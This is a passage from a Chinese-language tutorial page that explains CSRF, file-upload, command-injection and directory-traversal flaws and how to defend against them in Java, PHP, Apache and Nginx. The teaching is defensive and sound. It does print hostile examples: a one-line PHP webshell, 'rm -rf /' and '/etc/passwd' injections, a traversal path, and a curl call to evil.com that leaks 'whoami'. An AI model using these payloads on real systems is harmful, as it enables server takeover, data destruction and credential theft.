<li><p><strong>短信验证码&#x2F;邮箱验证</strong>：用户输入后才能继续</p>
</li>
</ul>
<p>📌 举例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return confirm(&#x27;你确认要删除吗？&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>虽然不能完全代替 CSRF Token，但能加一道门槛。</p>
<hr>
<h2 id="✅-总结一下-1"><a href="#✅-总结一下-1" class="headerlink" title="✅ 总结一下"></a>✅ 总结一下</h2><table>
<thead>
<tr>
<th>防御手段</th>
<th>说明</th>
<th>推荐指数</th>
</tr>
</thead>
<tbody><tr>
<td>CSRF Token</td>
<td>绑定用户会话验证请求来源</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>SameSite Cookie</td>
<td>浏览器限制跨站 Cookie 携带</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>二次确认</td>
<td>提醒&#x2F;打断操作流程，降低风险</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<h2 id="🔁-CSRF-和-XSS-的区别？"><a href="#🔁-CSRF-和-XSS-的区别？" class="headerlink" title="🔁 CSRF 和 XSS 的区别？"></a>🔁 CSRF 和 XSS 的区别？</h2><table>
<thead>
<tr>
<th>项目</th>
<th>XSS</th>
<th>CSRF</th>
</tr>
</thead>
<tbody><tr>
<td>原理</td>
<td>执行恶意脚本</td>
<td>利用用户的 Cookie 发起伪造请求</td>
</tr>
<tr>
<td>目标</td>
<td>窃取用户信息、控制页面</td>
<td>伪造用户行为、完成敏感操作</td>
</tr>
<tr>
<td>条件</td>
<td>网站对输入不做转义</td>
<td>网站没有做请求来源验证</td>
</tr>
<tr>
<td>防御</td>
<td>HTML 编码、CSP</td>
<td>CSRF Token、SameSite Cookie</td>
</tr>
</tbody></table>
<hr>
<p>如果你是 Web 开发者，只要是<strong>有用户登录系统、支持操作的后端请求（特别是 POST&#x2F;PUT&#x2F;DELETE）</strong>，都必须加上 <strong>CSRF 防护</strong>。</p>
<hr>
<p>好的，我们来详细、通俗地讲解“📂 四、文件上传漏洞”到底是什么，为什么它危险，以及我们怎么防范它。</p>
<hr>
<h2 id="📂-文件上传漏洞是什么？"><a href="#📂-文件上传漏洞是什么？" class="headerlink" title="📂 文件上传漏洞是什么？"></a>📂 文件上传漏洞是什么？</h2><p>文件上传漏洞，是指攻击者通过上传<strong>恶意文件</strong>（如脚本、木马、WebShell），并想办法让这些文件在服务器上被<strong>“执行”</strong>，从而达到控制服务器、窃取数据等目的。</p>
<hr>
<h3 id="🧨-举个真实感一点的例子："><a href="#🧨-举个真实感一点的例子：" class="headerlink" title="🧨 举个真实感一点的例子："></a>🧨 举个真实感一点的例子：</h3><p>你的网站有一个头像上传功能，允许用户上传 <code>.jpg</code> 图片。</p>
<p>攻击者上传了一个“伪装成图片”的 PHP 脚本，比如叫：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php</span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传后，他访问这个地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-site.com/uploads/shell.php?cmd=ls</span><br></pre></td></tr></table></figure>

<p>你的网站<strong>就执行了他的命令！</strong> 这就变成了<strong>WebShell</strong>（远程控制器）！</p>
<p>攻击者可以接下来运行：</p>
<ul>
<li><p><code>rm -rf /</code> 删除你所有文件</p>
</li>
<li><p><code>cat config.php</code> 查看数据库密码</p>
</li>
<li><p>甚至反弹一个远程终端控制整台服务器！</p>
</li>
</ul>
<hr>
<h2 id="🚨-危害有多大？"><a href="#🚨-危害有多大？" class="headerlink" title="🚨 危害有多大？"></a>🚨 危害有多大？</h2><table>
<thead>
<tr>
<th>危害</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>⛏ 远程控制服务器</td>
<td>上传 WebShell 后可远程操作</td>
</tr>
<tr>
<td>📂 窃取敏感信息</td>
<td>如数据库配置、用户密码等</td>
</tr>
<tr>
<td>🧨 上传木马</td>
<td>用来监听、攻击别的网站</td>
</tr>
<tr>
<td>🔥 被挂黑页</td>
<td>你的站被变成非法内容或跳转赌博钓鱼网站</td>
</tr>
</tbody></table>
<hr>
<h2 id="🛡-如何防御文件上传漏洞？"><a href="#🛡-如何防御文件上传漏洞？" class="headerlink" title="🛡 如何防御文件上传漏洞？"></a>🛡 如何防御文件上传漏洞？</h2><hr>
<h3 id="✅-1-严格限制上传文件的类型和大小"><a href="#✅-1-严格限制上传文件的类型和大小" class="headerlink" title="✅ 1. 严格限制上传文件的类型和大小"></a>✅ 1. 严格限制上传文件的类型和大小</h3><p><strong>前端 + 后端都要限制！后端更关键！</strong></p>
<h4 id="不安全做法（仅前端）："><a href="#不安全做法（仅前端）：" class="headerlink" title="不安全做法（仅前端）："></a>不安全做法（仅前端）：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以绕过！</p>
<h4 id="更安全的后端检查（PHP示例）："><a href="#更安全的后端检查（PHP示例）：" class="headerlink" title="更安全的后端检查（PHP示例）："></a>更安全的后端检查（PHP示例）：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowedTypes</span> = [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$allowedTypes</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不允许的文件类型&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再加上限制大小：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件太大&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="✅-2-上传后重命名文件，并做路径隔离"><a href="#✅-2-上传后重命名文件，并做路径隔离" class="headerlink" title="✅ 2. 上传后重命名文件，并做路径隔离"></a>✅ 2. 上传后<strong>重命名文件</strong>，并做<strong>路径隔离</strong></h3><p>别让攻击者控制上传文件的名字！</p>
<h4 id="安全做法："><a href="#安全做法：" class="headerlink" title="安全做法："></a>安全做法：</h4><ul>
<li><p>上传后改名为随机字符串（如 <code>uuid.jpg</code>）</p>
</li>
<li><p>放在一个<strong>不可执行的目录</strong>中，比如 <code>/uploads/images/</code></p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$newName</span> = <span class="title function_ invoke__">uniqid</span>() . <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/var/www/uploads/&#x27;</span> . <span class="variable">$newName</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="✅-3-禁止上传目录执行脚本（最关键！）"><a href="#✅-3-禁止上传目录执行脚本（最关键！）" class="headerlink" title="✅ 3. 禁止上传目录执行脚本（最关键！）"></a>✅ 3. 禁止上传目录执行脚本（最关键！）</h3><p>服务器要配置：</p>
<ul>
<li><p>上传目录<strong>不能运行 PHP、ASP、JSP 等动态脚本</strong></p>
</li>
<li><p>最好设成“纯静态文件目录”</p>
</li>
</ul>
<h4 id="Apache-可用-htaccess-限制："><a href="#Apache-可用-htaccess-限制：" class="headerlink" title="Apache 可用 .htaccess 限制："></a>Apache 可用 <code>.htaccess</code> 限制：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 阻止解析 PHP</span></span><br><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="attribute">RemoveHandler</span> .php</span><br></pre></td></tr></table></figure>

<h4 id="Nginx-示例："><a href="#Nginx-示例：" class="headerlink" title="Nginx 示例："></a>Nginx 示例：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* \.(jpg|jpeg|png|gif)$</span> &#123;</span><br><span class="line">        <span class="attribute">allow</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="✅-4-对文件内容进行安全扫描"><a href="#✅-4-对文件内容进行安全扫描" class="headerlink" title="✅ 4. 对文件内容进行安全扫描"></a>✅ 4. 对文件内容进行安全扫描</h3><p>可以调用杀毒&#x2F;扫描工具，如：</p>
<ul>
<li><p>ClamAV（开源杀毒引擎）</p>
</li>
<li><p>云服务提供的文件安全 API（如阿里云、腾讯云）</p>
</li>
</ul>
<p>也可以检查文件<strong>魔术头（magic number）</strong>，防止“伪装成图片”的脚本。</p>
<p>📌 例如，JPEG 文件开头应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0</span><br></pre></td></tr></table></figure>

<p>你可以读取文件头进行验证。</p>
<hr>
<h2 id="✅-总结一张表："><a href="#✅-总结一张表：" class="headerlink" title="✅ 总结一张表："></a>✅ 总结一张表：</h2><table>
<thead>
<tr>
<th>防御措施</th>
<th>描述</th>
<th>推荐程度</th>
</tr>
</thead>
<tbody><tr>
<td>限制类型和大小</td>
<td>拒绝非图片或过大文件</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>路径隔离和重命名</td>
<td>攻击者无法猜到文件路径</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>上传目录禁执行</td>
<td>核心措施，防止脚本被运行</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>内容安全扫描</td>
<td>进一步阻断伪装文件</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<h2 id="🔁-文件上传漏洞-vs-XSS-CSRF-对比"><a href="#🔁-文件上传漏洞-vs-XSS-CSRF-对比" class="headerlink" title="🔁 文件上传漏洞 vs XSS&#x2F;CSRF 对比"></a>🔁 文件上传漏洞 vs XSS&#x2F;CSRF 对比</h2><table>
<thead>
<tr>
<th>项目</th>
<th>文件上传漏洞</th>
<th>XSS</th>
<th>CSRF</th>
</tr>
</thead>
<tbody><tr>
<td>利用点</td>
<td>上传功能</td>
<td>用户输入点</td>
<td>请求行为</td>
</tr>
<tr>
<td>风险对象</td>
<td>服务器</td>
<td>浏览器用户</td>
<td>登录用户</td>
</tr>
<tr>
<td>危害级别</td>
<td>高（可控制主机）</td>
<td>中（盗信息、弹窗）</td>
<td>中（伪操作）</td>
</tr>
</tbody></table>
<hr>
<p>如果你的网站有<strong>任何文件上传接口</strong>（头像、简历、附件等），一定要严格处理，<strong>不要轻信用户上传的任何东西！</strong></p>
<hr>
<p>当然可以，下面我们来详细通俗地讲解：</p>
<hr>
<h2 id="🏷️-五、命令注入（Command-Injection）"><a href="#🏷️-五、命令注入（Command-Injection）" class="headerlink" title="🏷️ 五、命令注入（Command Injection）"></a>🏷️ 五、命令注入（Command Injection）</h2><h3 id="💣-描述"><a href="#💣-描述" class="headerlink" title="💣 描述"></a>💣 描述</h3><p><strong>命令注入漏洞</strong>是指攻击者通过输入恶意内容，将系统命令注入到后台代码中，被服务器直接执行，从而执行任意操作。</p>
<p>这类漏洞的本质是：</p>
<blockquote>
<p><strong>开发者在代码中调用了系统命令，并把用户输入拼接进去了</strong>，攻击者就能“插入其他命令”，实现对操作系统的控制。</p>
</blockquote>
<hr>
<h2 id="🧨-举个例子说明（以-Java-为例）"><a href="#🧨-举个例子说明（以-Java-为例）" class="headerlink" title="🧨 举个例子说明（以 Java 为例）"></a>🧨 举个例子说明（以 Java 为例）</h2><p>假设你用 Java 写了一个功能，用户输入一个 IP，然后服务器 ping 这个 IP 地址：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;ip&quot;</span>);</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;ping &quot;</span> + ip);</span><br></pre></td></tr></table></figure>

<p>表面上你只想让他执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 8.8.8.8</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="🦹-攻击者输入："><a href="#🦹-攻击者输入：" class="headerlink" title="🦹 攻击者输入："></a>🦹 攻击者输入：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8 &amp;&amp; rm -rf /</span><br></pre></td></tr></table></figure>

<p>变成执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 8.8.8.8 &amp;&amp; rm -rf /</span><br></pre></td></tr></table></figure>

<p>🚨<strong>后果：服务器文件全部被删除！</strong></p>
<hr>
<h2 id="☠️-命令注入常见表现"><a href="#☠️-命令注入常见表现" class="headerlink" title="☠️ 命令注入常见表现"></a>☠️ 命令注入常见表现</h2><table>
<thead>
<tr>
<th>输入字段</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td><code>;</code> 分号</td>
<td>执行多条命令</td>
</tr>
<tr>
<td><code>&amp;&amp;</code></td>
<td>如果前面成功，执行后面</td>
</tr>
<tr>
<td>&#96;</td>
<td>&#96; 管道符</td>
</tr>
<tr>
<td><code>\</code></td>
<td>转义符用于构造路径</td>
</tr>
</tbody></table>
<p>攻击者可构造如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1; cat /etc/passwd</span><br><span class="line">127.0.0.1 &amp;&amp; curl http://evil.com/`whoami`</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="🛡-如何防御命令注入？（特别是-Java-后端）"><a href="#🛡-如何防御命令注入？（特别是-Java-后端）" class="headerlink" title="🛡 如何防御命令注入？（特别是 Java 后端）"></a>🛡 如何防御命令注入？（特别是 Java 后端）</h2><hr>
<h3 id="✅-1-完全避免拼接命令字符串"><a href="#✅-1-完全避免拼接命令字符串" class="headerlink" title="✅ 1. 完全避免拼接命令字符串"></a>✅ 1. <strong>完全避免拼接命令字符串</strong></h3><p><strong>最关键！永远不要这样做</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ping &quot;</span> + userInput;</span><br><span class="line">Runtime.getRuntime().exec(cmd);  <span class="comment">// ❌危险！</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="✅-2-使用-ProcessBuilder-或-new-ProcessBuilder-start"><a href="#✅-2-使用-ProcessBuilder-或-new-ProcessBuilder-start" class="headerlink" title="✅ 2. 使用 ProcessBuilder 或 new ProcessBuilder(...).start()"></a>✅ 2. 使用 <code>ProcessBuilder</code> 或 <code>new ProcessBuilder(...).start()</code></h3><p>Java 推荐使用 <code>ProcessBuilder</code>，可以安全地传参，不拼接字符串。</p>
<h4 id="安全示例："><a href="#安全示例：" class="headerlink" title="安全示例："></a>安全示例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;ip&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单检查（只允许数字、点）</span></span><br><span class="line"><span class="keyword">if</span> (!ip.matches(<span class="string">&quot;^[0-9\\.]+$&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;非法 IP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;ping&quot;</span>, ip);</span><br><span class="line">pb.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> pb.start();</span><br></pre></td></tr></table></figure>

<p>☑️ 这里 <code>ping</code> 和 <code>ip</code> 是分开的参数，<strong>攻击者无法注入额外命令</strong>！</p>
<hr>
<h3 id="✅-3-对参数进行白名单验证"><a href="#✅-3-对参数进行白名单验证" class="headerlink" title="✅ 3. 对参数进行白名单验证"></a>✅ 3. 对参数进行<strong>白名单验证</strong></h3><ul>
<li><p>只允许合法的 IP、文件名、路径等</p>
</li>
<li><p>不用黑名单（攻击者总有新招），用<strong>白名单</strong></p>
</li>
</ul>
<p>📌 示例（Java）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ip.matches(<span class="string">&quot;^[0-9\\.]+$&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;非法 IP&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="✅-4-权限隔离"><a href="#✅-4-权限隔离" class="headerlink" title="✅ 4. 权限隔离"></a>✅ 4. 权限隔离</h3><p>即使命令被执行，也不能做坏事：</p>
<ul>
<li><p>后台运行账户使用权限<strong>最小化</strong>（不要用 root）</p>
</li>
<li><p>设置服务器的访问权限和文件夹权限</p>
</li>
</ul>
<hr>
<h2 id="✅-总结对照表："><a href="#✅-总结对照表：" class="headerlink" title="✅ 总结对照表："></a>✅ 总结对照表：</h2><table>
<thead>
<tr>
<th>防御措施</th>
<th>说明</th>
<th>推荐程度</th>
</tr>
</thead>
<tbody><tr>
<td>不拼接命令字符串</td>
<td>根源性防护</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>使用 <code>ProcessBuilder</code></td>
<td>参数隔离、安全接口</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>严格白名单验证</td>
<td>阻止非法参数</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>最小权限原则</td>
<td>降低攻击后果</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<h2 id="⚔️-与-SQL-注入-XSS-对比"><a href="#⚔️-与-SQL-注入-XSS-对比" class="headerlink" title="⚔️ 与 SQL 注入 &#x2F; XSS 对比"></a>⚔️ 与 SQL 注入 &#x2F; XSS 对比</h2><table>
<thead>
<tr>
<th>类型</th>
<th>注入位置</th>
<th>危害</th>
<th>典型例子</th>
</tr>
</thead>
<tbody><tr>
<td>SQL 注入</td>
<td>数据库查询语句</td>
<td>读写数据库</td>
<td><code>&#39; OR 1=1 --</code></td>
</tr>
<tr>
<td>XSS</td>
<td>网页内容 &#x2F; 前端渲染</td>
<td>窃 Cookie &#x2F; 执行 JS</td>
<td><code>&lt;script&gt;</code></td>
</tr>
<tr>
<td>命令注入</td>
<td>系统命令调用</td>
<td>控制服务器、执行命令</td>
<td><code>&amp;&amp; rm -rf /</code></td>
</tr>
</tbody></table>
<hr>
<p>如果你在 Java 项目中需要执行系统命令，一定记得使用 <code>ProcessBuilder</code>、白名单校验，并尽可能避免让用户控制命令参数。</p>
<hr>
<p>当然可以！我们来<strong>详细通俗地讲解“🔍 六、目录遍历攻击（Directory Traversal）”</strong>，并结合实际例子说明它的危害和防御方法。</p>
<hr>
<h2 id="🔍-什么是目录遍历攻击？"><a href="#🔍-什么是目录遍历攻击？" class="headerlink" title="🔍 什么是目录遍历攻击？"></a>🔍 什么是目录遍历攻击？</h2><p><strong>目录遍历（Directory Traversal）</strong>是指攻击者试图通过输入特殊路径，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>来“跳出”当前文件夹，访问服务器上<strong>本不该被访问的敏感文件</strong>。</p>
<blockquote>
<p>简单说：<strong>攻击者在网页上传了个“走楼梯”的路径，翻出了你设置的“安全小区”，进了你家机房！</strong></p>
</blockquote>
<hr>
<h3 id="🧠-举个实际例子"><a href="#🧠-举个实际例子" class="headerlink" title="🧠 举个实际例子"></a>🧠 举个实际例子</h3><p>你的网站有这样一个文件下载功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://your-site.com/download?file=report.pdf</span><br></pre></td></tr></table></figure>

<p>后端代码（Java 举例）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/var/www/uploads/&quot;</span> + file);</span><br><span class="line">Files.copy(f.toPath(), response.getOutputStream());</span><br></pre></td></tr></table></figure>

<p>看起来只会访问 <code>/uploads/</code> 里的文件，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/uploads/report.pdf</span><br></pre></td></tr></table></figure>

<p>但如果攻击者访问：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://your-site.com/download?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>那么最终访问的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>

<p>💥 你服务器的用户账号文件就暴露了！</p>
<hr>
<h2 id="🚨-为什么危险？"><a href="#🚨-为什么危险？" class="headerlink" title="🚨 为什么危险？"></a>🚨 为什么危险？</h2><table>
<thead>
<tr>
<th>文件</th>
<th>危害</th>
</tr>
</thead>
<tbody><tr>
<td><code>/etc/passwd</code></td>
<td>查看系统所有用户信息（Linux）</td>
</tr>
<tr>
<td><code>C:\windows\system.ini</code></td>
<td>Windows 系统配置</td>
</tr>
<tr>
<td>应用配置文件</td>
<td>泄露数据库账号密码</td>
</tr>
<tr>
<td>源代码</td>
<td>揭露后门&#x2F;逻辑漏洞</td>
</tr>
<tr>
<td>私密文件</td>
<td>用户上传的未授权访问资料</td>
</tr>
</tbody></table>
<p>攻击者甚至可以用此手段<strong>下载你的整个项目源码或配置</strong>！</p>
<hr>
<h2 id="🛡-如何防御目录遍历攻击？"><a href="#🛡-如何防御目录遍历攻击？" class="headerlink" title="🛡 如何防御目录遍历攻击？"></a>🛡 如何防御目录遍历攻击？</h2><hr>
<h3 id="✅-1-规范化路径，禁止-和绝对路径"><a href="#✅-1-规范化路径，禁止-和绝对路径" class="headerlink" title="✅ 1. 规范化路径，禁止 .. 和绝对路径"></a>✅ 1. <strong>规范化路径，禁止 <code>..</code> 和绝对路径</strong></h3><p>使用 Java 时，可以借助 <code>Path.normalize()</code> 清洗路径。</p>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接前的基础路径</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">basePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/var/www/uploads&quot;</span>).toAbsolutePath().normalize();</span><br><span class="line"><span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> basePath.resolve(file).normalize();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否跳出了 uploads 目录</span></span><br><span class="line"><span class="keyword">if</span> (!filePath.startsWith(basePath)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;非法访问&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Files.copy(filePath, response.getOutputStream());</span><br></pre></td></tr></table></figure>

<p>这段代码做了两件事：</p>
<ul>
<li><p><strong>规范路径</strong>：将类似 <code>../</code> 的部分“解析”为真实路径</p>
</li>
<li><p><strong>限制访问范围</strong>：不允许越界访问其他目录</p>
</li>
</ul>
<hr>
<h3 id="✅-2-只允许白名单中的文件名"><a href="#✅-2-只允许白名单中的文件名" class="headerlink" title="✅ 2. 只允许白名单中的文件名"></a>✅ 2. 只允许<strong>白名单中的文件名</strong></h3><p>如果你只是让用户下载某几个固定文件，最安全的是只用白名单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; allowedFiles = Arrays.asList(<span class="string">&quot;report1.pdf&quot;</span>, <span class="string">&quot;report2.pdf&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!allowedFiles.contains(file)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;非法文件&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，<strong>用户输入的文件名必须是你预先允许的，别的统统拒绝！</strong></p>
<hr>
<h3 id="✅-3-不要让用户控制“完整路径”"><a href="#✅-3-不要让用户控制“完整路径”" class="headerlink" title="✅ 3. 不要让用户控制“完整路径”"></a>✅ 3. 不要让用户控制“完整路径”</h3><p>比如以下是错误示范：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;path&quot;</span>); <span class="comment">// ❌危险</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以直接输入 <code>/etc/passwd</code>，绕过你的路径控制。</p>
<p>一定要让路径控制在你的服务逻辑中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/static/reports/&quot;</span> + safeFileName;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="✅-总结对照表"><a href="#✅-总结对照表" class="headerlink" title="✅ 总结对照表"></a>✅ 总结对照表</h2><table>
<thead>
<tr>
<th>防御措施</th>
<th>描述</th>
<th>推荐指数</th>
</tr>
</thead>
<tbody><tr>
<td>路径规范化 + 限定根路径</td>
<td>防止跳目录</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
